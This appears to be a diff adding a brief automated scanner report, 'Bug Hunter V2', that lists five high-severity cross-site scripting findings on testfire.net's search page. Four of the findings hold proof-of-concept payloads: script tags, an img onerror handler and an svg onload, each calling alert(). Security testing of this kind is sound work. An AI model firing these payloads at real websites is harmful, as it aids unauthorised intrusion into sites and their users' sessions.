@@ -1,0 +1,6 @@
+Bug Hunter V2 Report
+[HIGH] XSS: http://testfire.net/search.jsp?query=<script>alert('XSS1')</script>
+[HIGH] XSS: http://testfire.net/search.jsp?query='"><script>alert('XSS2')</script>
+[HIGH] XSS: http://testfire.net/search.jsp?query=<img src=x onerror=alert('XSS3')>
+[HIGH] XSS: http://testfire.net/search.jsp?query=<svg onload=alert('XSS4')>
+[HIGH] XSS: http://testfire.net/search.jsp?query=XSS-TEST-5
